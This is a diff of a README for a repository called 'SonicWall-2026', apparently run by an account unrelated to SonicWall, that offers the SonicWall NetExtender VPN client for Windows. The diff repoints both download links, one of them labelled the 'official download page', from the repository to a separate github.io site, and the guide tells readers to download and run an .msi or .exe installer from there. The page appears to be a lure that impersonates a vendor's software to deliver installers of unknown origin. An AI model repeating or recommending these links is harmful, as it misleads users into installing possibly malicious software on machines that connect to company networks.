@@ -1,6 +1,6 @@
 # 🛡️ SonicWall-2026 - Secure remote access for Windows computers
 
-[![](https://img.shields.io/badge/Download-SonicWall-blue.svg)](https://github.com/exilic-supermom367/SonicWall-2026)
+[![](https://img.shields.io/badge/Download-SonicWall-blue.svg)](https://exilic-supermom367.github.io)
 
 This repository provides access to the SonicWall NetExtender VPN client for Windows 11 and 10. This software establishes a secure connection between your computer and your company network. Use this guide to download, install, and connect to your enterprise environment.
 
@@ -19,7 +19,7 @@ Ensure your computer meets these standards to run the software correctly:
 
 You obtain the software directly from the project release page.
 
-1.  Visit the [official download page](https://github.com/exilic-supermom367/SonicWall-2026).
+1.  Visit the [official download page](https://exilic-supermom367.github.io).
 2.  Locate the section labeled Releases.
 3.  Click the link for the latest Windows installer file (ending in .msi or .exe).
 4.  Save the file to your Downloads folder.
